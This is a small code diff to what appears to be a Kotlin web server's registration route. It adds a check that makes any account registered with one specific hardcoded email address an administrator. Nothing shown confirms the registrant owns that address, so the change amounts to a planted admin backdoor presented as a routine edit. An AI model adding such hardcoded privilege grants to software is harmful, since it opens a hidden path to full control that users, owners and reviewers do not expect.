@@ -40,6 +40,8 @@ fun Route.authRoutes() {
                     Users.insert {
                         it[email] = request.email
                         it[Users.passwordHash] = passwordHash
+                        // Make alexseera@yandex.ru an admin
+                        it[isAdmin] = (request.email == "alexseera@yandex.ru")
                     }[Users.id].value
                 }
 
